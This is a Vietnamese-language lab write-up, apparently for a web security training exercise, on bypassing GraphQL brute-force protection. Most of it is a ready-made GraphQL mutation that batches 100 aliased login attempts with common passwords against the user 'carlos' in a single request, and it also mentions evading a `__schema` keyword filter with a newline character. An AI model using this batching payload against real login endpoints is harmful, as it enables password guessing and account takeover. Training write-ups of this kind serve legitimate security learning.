## Bypassing GraphQL brute force protections
* Ở bài trước ta tìm được điểm cuối của API và vượt qua filter từ khóa, nó chặn các truy vấn có chuỗi `__schema` thì ta chèn kí tự `%0a` để có thể bybass được regex đấy.
* Còn ở bài này chúng ta phải burteforce bằng hàng trăm thử nghiệm vào 1 resquest duy nhất.
* Đầu tiên thử đăng nhập với username là carlos.
* <img width="1063" height="548" alt="image" src="https://github.com/user-attachments/assets/b649879c-f5c1-412d-b90f-958fb02e2f65" />
* Thử đăng nhập với mật khẩu sai ta thấy được là hàm sử dụng là login. Tham số đầu vào là `LoginInput!` gồm `username` và `password`
* Dữ liệu trả về : `token` và `success:false`
* <pre>{
    "query": "mutation {
        brute0:login(input:{username: \"carlos\", password: \"123456\"}) { success, token }
        brute1:login(input:{username: \"carlos\", password: \"password\"}) { success, token }
        brute2:login(input:{username: \"carlos\", password: \"12345678\"}) { success, token }
        brute3:login(input:{username: \"carlos\", password: \"qwerty\"}) { success, token }
        brute4:login(input:{username: \"carlos\", password: \"123456789\"}) { success, token }
        brute5:login(input:{username: \"carlos\", password: \"12345\"}) { success, token }
        brute6:login(input:{username: \"carlos\", password: \"1234\"}) { success, token }
        brute7:login(input:{username: \"carlos\", password: \"111111\"}) { success, token }
        brute8:login(input:{username: \"carlos\", password: \"1234567\"}) { success, token }
        brute9:login(input:{username: \"carlos\", password: \"dragon\"}) { success, token }
        brute10:login(input:{username: \"carlos\", password: \"123123\"}) { success, token }
        brute11:login(input:{username: \"carlos\", password: \"baseball\"}) { success, token }
        brute12:login(input:{username: \"carlos\", password: \"abc123\"}) { success, token }
        brute13:login(input:{username: \"carlos\", password: \"football\"}) { success, token }
        brute14:login(input:{username: \"carlos\", password: \"monkey\"}) { success, token }
        brute15:login(input:{username: \"carlos\", password: \"letmein\"}) { success, token }
        brute16:login(input:{username: \"carlos\", password: \"shadow\"}) { success, token }
        brute17:login(input:{username: \"carlos\", password: \"master\"}) { success, token }
        brute18:login(input:{username: \"carlos\", password: \"666666\"}) { success, token }
        brute19:login(input:{username: \"carlos\", password: \"qwertyuiop\"}) { success, token }
        brute20:login(input:{username: \"carlos\", password: \"123321\"}) { success, token }
        brute21:login(input:{username: \"carlos\", password: \"mustang\"}) { success, token }
        brute22:login(input:{username: \"carlos\", password: \"1234567890\"}) { success, token }
        brute23:login(input:{username: \"carlos\", password: \"michael\"}) { success, token }
        brute24:login(input:{username: \"carlos\", password: \"654321\"}) { success, token }
        brute25:login(input:{username: \"carlos\", password: \"superman\"}) { success, token }
        brute26:login(input:{username: \"carlos\", password: \"1qaz2wsx\"}) { success, token }
        brute27:login(input:{username: \"carlos\", password: \"7777777\"}) { success, token }
        brute28:login(input:{username: \"carlos\", password: \"121212\"}) { success, token }
        brute29:login(input:{username: \"carlos\", password: \"000000\"}) { success, token }
        brute30:login(input:{username: \"carlos\", password: \"qazwsx\"}) { success, token }
        brute31:login(input:{username: \"carlos\", password: \"123qwe\"}) { success, token }
        brute32:login(input:{username: \"carlos\", password: \"killer\"}) { success, token }
        brute33:login(input:{username: \"carlos\", password: \"trustno1\"}) { success, token }
        brute34:login(input:{username: \"carlos\", password: \"jordan\"}) { success, token }
        brute35:login(input:{username: \"carlos\", password: \"jennifer\"}) { success, token }
        brute36:login(input:{username: \"carlos\", password: \"zxcvbnm\"}) { success, token }
        brute37:login(input:{username: \"carlos\", password: \"asdfgh\"}) { success, token }
        brute38:login(input:{username: \"carlos\", password: \"hunter\"}) { success, token }
        brute39:login(input:{username: \"carlos\", password: \"buster\"}) { success, token }
        brute40:login(input:{username: \"carlos\", password: \"soccer\"}) { success, token }
        brute41:login(input:{username: \"carlos\", password: \"harley\"}) { success, token }
        brute42:login(input:{username: \"carlos\", password: \"batman\"}) { success, token }
        brute43:login(input:{username: \"carlos\", password: \"andrew\"}) { success, token }
        brute44:login(input:{username: \"carlos\", password: \"tigger\"}) { success, token }
        brute45:login(input:{username: \"carlos\", password: \"sunshine\"}) { success, token }
        brute46:login(input:{username: \"carlos\", password: \"iloveyou\"}) { success, token }
        brute47:login(input:{username: \"carlos\", password: \"2000\"}) { success, token }
        brute48:login(input:{username: \"carlos\", password: \"charlie\"}) { success, token }
        brute49:login(input:{username: \"carlos\", password: \"robert\"}) { success, token }
        brute50:login(input:{username: \"carlos\", password: \"thomas\"}) { success, token }
        brute51:login(input:{username: \"carlos\", password: \"hockey\"}) { success, token }
        brute52:login(input:{username: \"carlos\", password: \"ranger\"}) { success, token }
        brute53:login(input:{username: \"carlos\", password: \"daniel\"}) { success, token }
        brute54:login(input:{username: \"carlos\", password: \"starwars\"}) { success, token }
        brute55:login(input:{username: \"carlos\", password: \"klaster\"}) { success, token }
        brute56:login(input:{username: \"carlos\", password: \"112233\"}) { success, token }
        brute57:login(input:{username: \"carlos\", password: \"george\"}) { success, token }
        brute58:login(input:{username: \"carlos\", password: \"computer\"}) { success, token }
        brute59:login(input:{username: \"carlos\", password: \"michelle\"}) { success, token }
        brute60:login(input:{username: \"carlos\", password: \"jessica\"}) { success, token }
        brute61:login(input:{username: \"carlos\", password: \"pepper\"}) { success, token }
        brute62:login(input:{username: \"carlos\", password: \"1111\"}) { success, token }
        brute63:login(input:{username: \"carlos\", password: \"zxcvbn\"}) { success, token }
        brute64:login(input:{username: \"carlos\", password: \"555555\"}) { success, token }
        brute65:login(input:{username: \"carlos\", password: \"11111111\"}) { success, token }
        brute66:login(input:{username: \"carlos\", password: \"131313\"}) { success, token }
        brute67:login(input:{username: \"carlos\", password: \"freedom\"}) { success, token }
        brute68:login(input:{username: \"carlos\", password: \"777777\"}) { success, token }
        brute69:login(input:{username: \"carlos\", password: \"pass\"}) { success, token }
        brute70:login(input:{username: \"carlos\", password: \"maggie\"}) { success, token }
        brute71:login(input:{username: \"carlos\", password: \"159753\"}) { success, token }
        brute72:login(input:{username: \"carlos\", password: \"aaaaaa\"}) { success, token }
        brute73:login(input:{username: \"carlos\", password: \"ginger\"}) { success, token }
        brute74:login(input:{username: \"carlos\", password: \"princess\"}) { success, token }
        brute75:login(input:{username: \"carlos\", password: \"joshua\"}) { success, token }
        brute76:login(input:{username: \"carlos\", password: \"cheese\"}) { success, token }
        brute77:login(input:{username: \"carlos\", password: \"amanda\"}) { success, token }
        brute78:login(input:{username: \"carlos\", password: \"summer\"}) { success, token }
        brute79:login(input:{username: \"carlos\", password: \"love\"}) { success, token }
        brute80:login(input:{username: \"carlos\", password: \"ashley\"}) { success, token }
        brute81:login(input:{username: \"carlos\", password: \"nicole\"}) { success, token }
        brute82:login(input:{username: \"carlos\", password: \"chelsea\"}) { success, token }
        brute83:login(input:{username: \"carlos\", password: \"biteme\"}) { success, token }
        brute84:login(input:{username: \"carlos\", password: \"matthew\"}) { success, token }
        brute85:login(input:{username: \"carlos\", password: \"access\"}) { success, token }
        brute86:login(input:{username: \"carlos\", password: \"yankees\"}) { success, token }
        brute87:login(input:{username: \"carlos\", password: \"987654321\"}) { success, token }
        brute88:login(input:{username: \"carlos\", password: \"dallas\"}) { success, token }
        brute89:login(input:{username: \"carlos\", password: \"austin\"}) { success, token }
        brute90:login(input:{username: \"carlos\", password: \"thunder\"}) { success, token }
        brute91:login(input:{username: \"carlos\", password: \"taylor\"}) { success, token }
        brute92:login(input:{username: \"carlos\", password: \"matrix\"}) { success, token }
        brute93:login(input:{username: \"carlos\", password: \"mobilemail\"}) { success, token }
        brute94:login(input:{username: \"carlos\", password: \"mom\"}) { success, token }
        brute95:login(input:{username: \"carlos\", password: \"monitor\"}) { success, token }
        brute96:login(input:{username: \"carlos\", password: \"monitoring\"}) { success, token }
        brute97:login(input:{username: \"carlos\", password: \"montana\"}) { success, token }
        brute98:login(input:{username: \"carlos\", password: \"moon\"}) { success, token }
        brute99:login(input:{username: \"carlos\", password: \"moscow\"}) { success, token }
    }"
}</pre>
* Sau khi thêm cái này vào request thì ta nhận được response như sau
* <img width="529" height="241" alt="image" src="https://github.com/user-attachments/assets/fa4d1d7c-5eca-47fd-929c-cc05f17e216b" />
* Cuối cùng thử đăng nhập vào bằng mk đó thì ta đã slove được lab
